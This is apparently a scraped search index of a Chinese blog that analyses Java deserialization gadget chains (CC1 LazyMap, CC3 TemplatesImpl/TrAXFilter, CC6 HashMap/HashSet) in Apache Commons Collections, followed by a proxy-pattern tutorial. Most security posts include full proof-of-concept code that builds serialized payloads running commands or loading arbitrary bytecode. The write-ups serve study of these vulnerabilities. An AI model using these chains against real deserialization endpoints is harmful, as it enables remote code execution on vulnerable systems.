Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(tem), new InvokerTransformer(\"newTransformer\",null,null), }; ChainedTransformer cha=new ChainedTransformer(transformers); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); map.put(\"value\",\"aaa\"); Map\u003cObject,Object\u003e tmap=TransformedMap.decorate(map,null,cha);//静态方法调用 Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); Object obj=con.newInstance(Target.class,tmap); serilize(obj); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException{ ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }执行弹出计算机： ","date":"2024-06-27","objectID":"/posts/cc3/:1:0","tags":["java","反序列化"],"title":"CC3分析与利用","uri":"/posts/cc3/"},{"categories":["javasec"],"content":"CC1(LazyMap)+Temlatesimpl 和上面一样的把最后Runtime.getRuntime()改为TransformerImpl.newTransformer()， poc： package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import org.apache.commons.collections.map.LazyMap; import java.lang.annotation.Repeatable; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class CC3test { public static void main(String[] args) throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(tem), new InvokerTransformer(\"newTransformer\",null,null), }; ChainedTransformer cha=new ChainedTransformer(transformers); InvokerTransformer t = new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"calc\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"entrySe\",\"entrySet\"); //可以不用设，不要把key设为entrySet，不然不满足lazy.get条件 Map\u003cObject,Object\u003e Lazy = LazyMap.decorate(map,cha); Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); InvocationHandler hand=(InvocationHandler)con.newInstance(Override.class,Lazy); Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},hand); InvocationHandler in =(InvocationHandler) con.newInstance(Repeatable.class,proxyMap); serilize(in); deserilize(\"serr.bin\"); } public static void serilize(Object obj)throws IOException{ ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"serr.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }执行 当然Temlatesimpl和CC1结合就注定了其只能在jdk8u71之前的版本使用，对于其他版本的呢？ 不难想到其还可以和CC6结合使用 ","date":"2024-06-27","objectID":"/posts/cc3/:2:0","tags":["java","反序列化"],"title":"CC3分析与利用","uri":"/posts/cc3/"},{"categories":["javasec"],"content":"CC6+Timlatesimpl poc： package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.nio.file.Paths; public class CC3test { public static void main(String[] args) throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(tem), new InvokerTransformer(\"newTransformer\",null,null), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry Tie=new TiedMapEntry(Lazy,\"aaa\"); HashMap\u003cObject,Object\u003e hashmap = new HashMap\u003c\u003e(); hashmap.put(Tie,\"gaoren\"); Class\u003cLazyMap\u003e lazyMapClass = LazyMap.class; Field factoryField = lazyMapClass.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(Lazy, cha); Lazy.remove(\"aaa\"); serilize(hashmap); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }执行： ","date":"2024-06-27","objectID":"/posts/cc3/:3:0","tags":["java","反序列化"],"title":"CC3分析与利用","uri":"/posts/cc3/"},{"categories":["javasec"],"content":"CC3链子分析 有些黑名单除了过滤了Runtime还有可能过滤了InvokerTransformer，所以Temlatesmpl除了可以和cc1，cc6结合使用，还有其他链子可以使用，就是接下来要分析的cc3（其实也就是最后那里改变了一下）。 上面的cc1和cc6最后都是调用的newTransformer()方法，所以接着该方法向上找，最后发现在TrAXFilter类的构造函数中进行了调用，并且参数 templates可以由构造参数进行控制 但是发现其没有继承反序列化接口，所以还得和Runtime一样利用其class类来进行反射调用。不过不同的是这里使用的是InstantiateTransformer类的transform方法，看看其transform方法 可以看到先判断是否是class类，然后获得有参数构造函数，最后进行实例化。 (当然这利用InvokerTransformer的transform也能实现，先调用其class的getConstructor方法然后调用newInstance方法，不过如果能用这个transform方法的话还不如像前面一样直接调用newTransformer()) 先构造手动调用InstantiateTransformer.tranform方法的poc： package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.nio.file.Paths; public class CC3test { public static void main(String[] args) throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tem}) }; Transformer transformerChain = new ChainedTransformer(transformers); transformerChain.transform(\"aaa\"); public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }执行 然后剩下的就没什么了，接着cc1或者cc6的前部分就行了。 我这里就用cc6了， package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import java.io.*; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.nio.file.Paths; public class CC3test { public static void main(String[] args) throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tem}) }; Transformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry Tie=new TiedMapEntry(Lazy,\"aaa\"); HashMap\u003cObject,Object\u003e hashmap = new HashMap\u003c\u003e(); hashmap.put(Tie,\"gaoren\"); Class\u003cLazyMap\u003e lazyMapClass = LazyMap.class; Field factoryField = lazyMapClass.getDeclaredField(\"","date":"2024-06-27","objectID":"/posts/cc3/:4:0","tags":["java","反序列化"],"title":"CC3分析与利用","uri":"/posts/cc3/"},{"categories":["javasec"],"content":"补充 一、 除了Temlatesimpl动态加载字节码还可不可以配合其他的如ClassLoader.defineClass和BCEL来加载字节码， 起初以为是因为这两个最后都需要多调用newInstance()方法进行实例化，但后面发现如果可以调用InvokerTransformer的话这个好像也不是问题。 所以又去看了 nivia 师傅的文章： 因为ClassLoader.defineClass方法是保护属性，在进行反射调用的时候需要执行Method.setAccessible(true);进行权限修改，而Method.setAccessible(true);没有返回值，会导致了断掉了后面Transformer.transform方法的调用。 com.sun.org.apache.bcel.internal.util.ClassLoader是没有实现Serializable接口的，不能进行发序列化（虽然我也没去试能不能利用反射进行构造） 二、 上面 cc1 和 cc6 结合 temlatesimpl 使用中，_tfactory 是 transient 属性，不能被反序列化，所以我们通过反射给其赋的值没有任何作用，反射赋值只是方便我们的直接调用。那最后为什么又能打通呢，我们把上面的反射赋值注释掉。进行调试 发现在调用hashmap的readObject的时候执行s.readObject，跟进 来到了TemplatesImpl的readObject方法，在这里对_tfactory进行了赋值： ","date":"2024-06-27","objectID":"/posts/cc3/:5:0","tags":["java","反序列化"],"title":"CC3分析与利用","uri":"/posts/cc3/"},{"categories":["javasec"],"content":"CC链6的分析与利用 经过之前对CC1链和URLDNS链的分析，感觉自己对反序列化也有了个比较清晰的认知。分析了这两条链子后就该分析CC6了，这条链子不受jdk的版本影响，并且只要 commons collections 小于等于3.2.1，都存在这个漏洞。 ","date":"2024-06-24","objectID":"/posts/cc6/:0:0","tags":["java","反序列化"],"title":"CC6分析与利用","uri":"/posts/cc6/"},{"categories":["javasec"],"content":"链子分析 ","date":"2024-06-24","objectID":"/posts/cc6/:1:0","tags":["java","反序列化"],"title":"CC6分析与利用","uri":"/posts/cc6/"},{"categories":["javasec"],"content":"变化 相比之前的CC1，在jdk8u_71之后，AnnotationInvocationHandler类被重写了，修改了readObject方法，里面没有了setValue方法。 下面是 jdk_17.0.11 版本的AnnotationInvocationHandler类中的readObject方法： 可以看到没有了setValue方法的调用，那么似乎就没办法利用CC1中的TransforMap链了。那利用另一条呢？ 先把LazyMap调用get方法的构造写出来（参考CC1的补充） package org.example; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; public class CC6test { public static void main(String[] args)throws Exception { InvokerTransformer t = new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"calc\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e Lazy = LazyMap.decorate(map,t); Lazy.get(Runtime.getRuntime()); } } 如果像之前一样接着LazyMap继续向上看，确实依然能发现invoke中还是调用了get方法，并且参数memberValues可控，但是下面readObject方法中的for循环，调用的参数不可控了，没法让其代理对象调用方法就没法到Handler的invoke方法了。 所以这里链子得另外找了，不过还是能继承到CC1的一些东西，直接从LazyMap.get向上找。 ","date":"2024-06-24","objectID":"/posts/cc6/:1:1","tags":["java","反序列化"],"title":"CC6分析与利用","uri":"/posts/cc6/"},{"categories":["javasec"],"content":"HashMap链 TiedMapEntry.getValue() 发现TiedMapEntry.java中的getValue调用了get方法，跟进看看参数map可以控制不。 可以通过构造函数进行控制 那么接下来就需要找谁调用了getValue方法，发现就在这个类里面的hashCode调用了getValue方法。 TiedMapEntry.hashCode() 简单测试构造： package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC6test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,cha); TiedMapEntry Tie=new TiedMapEntry(Lazy,\"aaa\"); Tie.hashCode(); } } HashMap.hash() 接下来该干什么就不用多说了，因为还没到readObject，所以还得继续找谁调用了hashCode()方法，不过这个hashCode方法在之前的URLDNS链中也有用过，是在HashMap中的hash()方法进行的调用，到这里就可以直接借用前面的URLDNS了，URLDNS链是： Gadget Chain: HashMap.readObject() HashMap.hash() URL.hashCode()直接能够到了readObject，这里把最后就只用调用TiedMapEntry类的hashCode方法就行了。链子就变为了： Gadget Chain: HashMap.readObject() HashMap.hash() TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ...put方法提前调用解决 不过这里也会出现另一个问题，在HashMap中的readObject的key值是通过HashMap.put进行赋值的，但在调用HashMap.put的时候也会触发到hashCode()方法，导致反序列化失败。 而且这里不像URL.hashCode可以通过反射修改hashCode的值来避免，这里是直接就调用了没有条件，所以得另想它法了。 那么可以在put的时候传个其他的Transformer对象，这样到最后就是调用的其他对象的transform方法了，然后再利用反射把factory参数改为ChainedTransformer，这样再反序列化的时候就可以调用到ChainedTransformer的transform方法了。 构造： package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC6test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry Tie=new TiedMapEntry(Lazy,\"aaa\"); HashMap\u003cObject,Object\u003e hashmap = new HashMap\u003c\u003e(); hashmap.put(Tie,\"gaoren\"); Class\u003cLazyMap\u003e lazyMapClass = LazyMap.class; Field factoryField = lazyMapClass.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(Lazy, cha); serilize(hashmap); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStr","date":"2024-06-24","objectID":"/posts/cc6/:1:2","tags":["java","反序列化"],"title":"CC6分析与利用","uri":"/posts/cc6/"},{"categories":["javasec"],"content":"HashSet链 HashSet.readObject() hashset中的readObject方法在最后会触发put，剩下的就不用说了，put就会上面说的put一样了，最后可以触发到hashcode方法： 但是这里需要吧e变为TiedMapEntry对象，这样才能触发到TiedMapEntry的hashcode方法。 在HashSet中提供了add方法，可以利用add对e赋值 poc： package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.*; import java.util.HashMap; import java.util.HashSet; import java.util.Map; import java.lang.reflect.Field; import java.lang.reflect.Modifier; public class CC6test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry Tie=new TiedMapEntry(Lazy,\"aaa\"); HashSet set=new HashSet(); set.add(Tie); Class\u003cLazyMap\u003e lazyMapClass = LazyMap.class; Field factoryField = lazyMapClass.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(Lazy, cha); Lazy.remove(\"aaa\"); // Object o=new Object(); // Class\u003cTiedMapEntry\u003e tie = TiedMapEntry.class; // Field field = tie.getDeclaredField(\"key\"); // Field modifiersField = Field.class.getDeclaredField(\"modifiers\"); // modifiersField.setAccessible(true); // modifiersField.setInt(field, field.getModifiers() \u0026 ~Modifier.FINAL); // field.setAccessible(true); // field.set(Tie,\"aaaaaaaa\"); serilize(set); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }","date":"2024-06-24","objectID":"/posts/cc6/:1:3","tags":["java","反序列化"],"title":"CC6分析与利用","uri":"/posts/cc6/"},{"categories":["javasec"],"content":"补充 在一开始调试CC6的时候，为了对比其和CC1的区别，我把jdk版本改为了jdku71然后下载sun包源码，直接把CC1的LazyMap链复制过去。 运行： 报错没什么好说的，断点调试， 发现弹出计算机了，在invoke方法打上断点发现竟然还能触发invoke方法，后面把序列化去掉后还是弹三个计算机，反正捣鼓了很久，最后在b站 白日梦组长 CC6评论区破案，是IDEA调试器问题，关掉下面两个就好了。 参考：https://blog.csdn.net/lkforce/article/details/90479650 ","date":"2024-06-24","objectID":"/posts/cc6/:2:0","tags":["java","反序列化"],"title":"CC6分析与利用","uri":"/posts/cc6/"},{"categories":["javasec"],"content":"参考 https://nivi4.notion.site/Java-CommonCollections6-b3a2ddf3ab16403699363c2ede802fcb https://www.bilibili.com/video/BV1yP4y1p7N7?spm_id_from=333.788.videopod.sections\u0026vd_source=063e9a026c6d4cc539742104e84a33c1 ","date":"2024-06-24","objectID":"/posts/cc6/:3:0","tags":["java","反序列化"],"title":"CC6分析与利用","uri":"/posts/cc6/"},{"categories":["javasec"],"content":"分析了上一条链子，其实在TransformMap类那里有个分叉点，就是还可以利用另一个类LazyMap进行transform方法的调用。 进入到LazyMap类中，发现get方法也调用了transform方法： 可以看到在调用方法之前有个if的判断，跟进这个containKey函数： 翻译一手： 也就是传入的key值是map键值对中没有的就会返回false了，这个很容易就能实现。 然后看看怎么控制参数factory，发现构造方法可以对factory进行赋值，虽然有两个构造方法但其参数类型不同先不管。 这里又是保护属性，需要找一找看有没有其他地方对其进行了调用。发现和TransformMap一样都有个静态方法decorate能够实现构造方法的调用。 测试一下： import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args) throws Exception { InvokerTransformer t = new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"calc\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e Lazy = LazyMap.decorate(map,t); Lazy.get(Runtime.getRuntime()); } } 还是和上一条链子一样，继续向上找看谁调用了get方法，发现有一千多个结果，这怎么找。 反正感觉应该和上一条链子是差不多的，直接从终点类AnnotationInvocationHandle开始找，不过发现memberValues.get并不在readObjetc中而是在invoke方法里。 但这里是Handler中的invoke方法，这不是很熟悉吗。在jdk动态代理是可以通过Proxy.newProxyInstance获得对象，然后调用该对象方法来达到Handler.invoke()方法。但是这怎么和readObject相联系呢？ 我们在来看看在执行readObject的时候有没有什么我们可以控制的方法调用（因为要通过方法调用来转到Handler.invoke()方法）， 这个首当其冲就应该想到memberValues吧，毕竟这个承参数最容易控制。然后看到在for循环的时候调用了其方法entrySet（下面它的其他方法就不用看了，调用到第一个方法的时候就已经转到Handler.invoke()方法了）。所以思路清晰了，就是让memberValues为Proxy.newProxyInstance获得的对象就行了。这样在进行反序列化的到for时就能自动进入invoke方法，在进入invoke方法时，我们在通过构造函数把memberValues设为lazyMap，这样就可以调用到lazyMap的get方法，在由get方法去调用transform方法。 反序列化是这样，所以构造序列化payload就行先把memberValues设为lazyMap，在把memberValues设为Proxy.newProxyInstance获得的对象。 先构造Hanlder对象： Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); InvocationHandler hand=(InvocationHandler)con.newInstance(Override.class,Lazy); //通过构造函数设memberValues为lazyMap然后利用Proxy.newProxyInstance获得的proxyMap对象并且handler参数为hand（这样就可转到AnnotationInvocationHandler的invoke方法呢） Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},hand);接下来只需要调用proxyMap的方法了，设memberValues为proxyMap： InvocationHandler in =(InvocationHandler) con.newInstance(Repeatable.class,proxyMap);所以最后poc： package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Repeatable; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Proxy; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); InvokerTransformer t = new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"calc\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"entrySe\",\"entrySet\"); //可以不用设，不要把key设为entrySet，不然不满足lazy.get条件 Map\u003cObject,Object\u003e Lazy = LazyMap.decorate(map,cha); Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); InvocationHandler hand=(InvocationHandler)con.newInstance(Override.class,Lazy); Map proxyMap = (Map) Proxy.newProxyInstan","date":"2024-06-22","objectID":"/posts/cc1%E8%A1%A5%E5%85%85-lazymap%E5%88%A9%E7%94%A8/:0:0","tags":["java","反序列化"],"title":"CC1补充-LazyMap利用","uri":"/posts/cc1%E8%A1%A5%E5%85%85-lazymap%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"代理模式是什么 一、概念 在有些情况下，一个客户不能或者不想直接访问另一个对象，这时需要找一个中介帮忙完成某项任务，这个中介就是代理对象。 例如：购买火车票不一定要去火车站买，可以通过 12306 网站或者去火车票代售点买。又如找女朋友、找保姆、找工作等都可以通过找中介完成。平时的交作业也是通过中介（课代表）来完成的。 二、定义 由于某些原因需要给某对象提供一个代理以控制对该对象的访问。 访问对象不适合或者不能直接引用目标对象，代理对象就可以作为访问对象和目标对象之间的中介。 三、代理模式中涉及的主要成员 抽象角色：通过接口或抽象类声明真实主题和代理对象实现的业务方法。 真实角色：实现了抽象主题中的具体业务，是代理对象所代表的真实对象，是最终要引用的对象。 代理：提供了与真实主题相同的接口，其内部含有对真实主题的引用，它可以访问、控制或扩展真实主题的功能。 客户 : 将要使用代理角色来进行一些操作 。 四、优点（都是些客套话） 代理模式在客户端与目标对象之间起到一个中介作用和保护目标对象的作用 代理对象可以扩展目标对象的功能 代理模式能将客户端与目标对象分离，在一定程度上降低了系统的耦合度，增加了程序的可扩展性 五、缺点 冗余，由于代理对象要实现与目标对象一致的接口，会产生过多的代理类 系统设计中类的数量增加，变得难以维护 ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:1:0","tags":["java"],"title":"java动态代理","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"静态代理 需要代理对象和目标对象实现一致的接口。 例如：学生交作业，一般都是学生先交给课代表，课代表交给老师这种模式。课代表在这里相当于说一个学生代理类。 homework.java（抽象角色：交作业） //抽象角色：交作业 public interface homework { public void hwsent(); }student.java（真实角色：学生） //真实角色：学生，交作业 public class student implements homework { public void hwsent() { System.out.println(\"张三交作业\"); } }Proxy.java（代理：课代表） //代理：课代表 public class Proxy implements homework{ student Student; public Proxy(student stu){ //代理类的构造函数，参数是待会传入的学生类的实列化 this.Student = (student) stu; } public void Helpsubmit(){ //添加的功能 System.out.println(\"课代表帮忙交作业\"); } public void hwsent() { //接口方法的重写 Helpsubmit(); this.Student.hwsent();//调用学生类的方法hwsent() } }Main.java（客户：老师，收学生作业） public class Main{ public static void main(String[] args){ System.out.println(\"老师收作业\"); student stu=new student(); Proxy kdb=new Proxy(stu); kdb.hwsent(); //通过调用课代表的hwsent()，而课代表的hwsent()方法又调用了学生的hwsent()方法来实现调用学生的hwsent() } } 在这个过程中，老师接触的是课代表，没有接触到具体学生，但是依旧能够收到作业。 **缺点：**一旦实现的功能增加，将会变得异常冗余和复杂，而且当需要的代理的对象过多就需要实现大量的代理类。 所以又有了动态代理。 ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:2:0","tags":["java"],"title":"java动态代理","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"动态代理 与静态代理相同，需要公共接口（抽象角色），委托类（也就是上面的学生，真实角色），代理类。区别就是动态代理是利用反射机制在运行时创建代理类，这样可以解决静态代理代码冗余，难以维护的缺点。 在Java中常用的动态代理有如下几种方式： JDK 原生动态代理 cglib 动态代理 javasist 动态代理 ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:3:0","tags":["java"],"title":"java动态代理","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"JDK 原生动态代理 首先实现一个InvocationHandler，方法调用会被转发到该类的invoke()方法。具体看下面newProxyInstance方法的第三个参数。 